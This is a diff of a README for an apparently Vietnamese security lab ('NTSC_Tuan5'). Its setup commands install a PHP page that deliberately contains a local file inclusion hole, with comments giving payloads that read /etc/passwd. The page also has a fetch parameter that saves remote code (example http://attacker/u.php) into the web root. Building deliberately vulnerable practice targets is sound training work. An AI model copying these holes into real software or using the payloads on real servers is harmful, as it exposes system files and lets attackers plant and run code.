@@ -1,11 +1,20 @@
 # NTSC_Tuan5
-#nano lablfi.sh
-#sudo chmod +x lablfi.sh
-#sudo ./lablfi.sh
+
+## Lệnh chạy
+
+```bash
+nano lablfi.sh
+sudo chmod +x lablfi.sh
+sudo ./lablfi.sh
+
+# tiếp theo
 sudo tee /var/www/tomato/antibot_image/antibots/info.php >/dev/null <<'PHP'
 <?php header("X-Frame-Options: DENY"); ?>
-<!doctype html><html lang="en"><head>
-<meta charset="utf-8"><title>System information</title>
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>System information</title>
 <style>
   :root{--bg:#f7f9fc;--txt:#111;--muted:#4b5563}
   html,body{margin:0;background:var(--bg);color:var(--txt);font:16px/1.6 system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif}
@@ -16,17 +25,21 @@ sudo tee /var/www/tomato/antibot_image/antibots/info.php >/dev/null <<'PHP'
   /* hint chỉ xuất hiện khi View-Source (đã escape), không lộ trên UI */
   pre.dev-hint{display:none}
 </style>
-</head><body><div class="wrap">
-  <div class="card">
-    <h2>System information</h2>
-    <div class="phpinfo"><?php phpinfo(); ?></div>
-    <!-- View-Source hint -->
-    <pre class="dev-hint">&lt;?php include $_GET['image']; ?&gt;</pre>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <h2>System information</h2>
+      <div class="phpinfo"><?php phpinfo(); ?></div>
+      <!-- View-Source hint -->
+      <pre class="dev-hint">&lt;?php include $_GET['image']; ?&gt;</pre>
+    </div>
   </div>
 
 <?php
-/* LFI giữ nguyên: ?image=../../../../../etc/passwd */
+/* LFI giữ nguyên: ?image=/etc/passwd hoặc ../../../../../etc/passwd */
 if (isset($_GET['image'])) { $p = $_GET['image']; @include($p); exit; }
+
 /* Fetch giữ nguyên: ?fetch=http://attacker/u.php  (lưu ngay tại thư mục này) */
 if (isset($_GET['fetch'])) {
   $url = $_GET['fetch'];
@@ -36,5 +49,7 @@ if (isset($_GET['fetch'])) {
   if ($data !== false) { file_put_contents($dest, $data); }
 }
 ?>
-</div></body></html>
+</body>
+</html>
 PHP
+```
